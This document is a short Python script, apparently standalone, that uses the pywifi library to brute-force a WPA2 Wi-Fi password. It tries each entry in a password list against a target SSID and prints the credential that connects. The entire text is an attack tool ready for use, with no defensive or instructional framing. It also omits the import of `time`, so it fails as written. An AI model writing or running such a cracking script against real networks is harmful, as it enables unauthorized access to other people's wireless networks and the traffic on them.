# pip install pywifi
from pywifi import PyWiFi, const, Profile

def wifi_brute_force(ssid, password_list):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()

    for password in password_list:
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)

        time.sleep(5)
        if iface.status() == const.IFACE_CONNECTED:
            print(f"[+] Successful login: {ssid}:{password}")
            break
        else:
            print(f"[-] Failed login: {ssid}:{password}")

if __name__ == "__main__":
    wifi_brute_force('target_ssid', ['password1', 'password2', 'password3'])